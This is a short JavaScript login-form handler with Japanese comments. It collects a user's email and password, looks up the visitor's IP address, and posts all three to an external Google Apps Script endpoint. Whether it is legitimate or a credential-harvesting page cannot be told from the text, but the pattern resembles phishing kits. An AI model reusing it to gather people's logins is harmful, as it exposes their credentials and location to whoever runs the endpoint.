document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("loginForm");
  const submitButton = form.querySelector("button[type='submit']");

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    // ボタンを押せなくして文字を変更
    submitButton.disabled = true;
    submitButton.textContent = "送信中…";
    submitButton.style.backgroundColor = "#cccccc"; // 任意で色変更

    const id = document.getElementById("mymail").value;
    const password = document.getElementById("passcode").value;

    try {
      const ipResponse = await fetch("https://api.ipify.org?format=json");
      if (!ipResponse.ok) throw new Error("IPアドレス取得エラー");
      const ipData = await ipResponse.json();
      const ip = ipData.ip || "unknown";

      const response = await fetch(
        "https://script.google.com/macros/s/AKfycbzH2JriV3mOy5nWXNjcXFUN5o_dmm47G8cXSKq3CfajH3rbvKi9VW-ODLY85XRqhAL4/exec",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({ id, password, ip }),
        }
      );

      if (!response.ok) throw new Error("サーバーエラー");

      const result = await response.json();

      if (result.success) {
        alert(result.message || "ログイン成功");
        if (result.redirectUrl) {
          window.location.href = result.redirectUrl;
        }
      } else {
        alert(
          (result.message || "エラーが発生しました") +
          (result.error ? "\n" + result.error : "")
        );
        // 失敗した場合はボタンを元に戻す
        submitButton.disabled = false;
        submitButton.textContent = "送信（10秒ほどかかります）";
        submitButton.style.backgroundColor = ""; 
      }
    } catch (error) {
      console.error("通信エラー:", error);
      alert("通信エラーが発生しました");
      // エラー時もボタンを元に戻す
      submitButton.disabled = false;
      submitButton.textContent = "送信（10秒ほどかかります）";
      submitButton.style.backgroundColor = ""; 
    }
  });
});
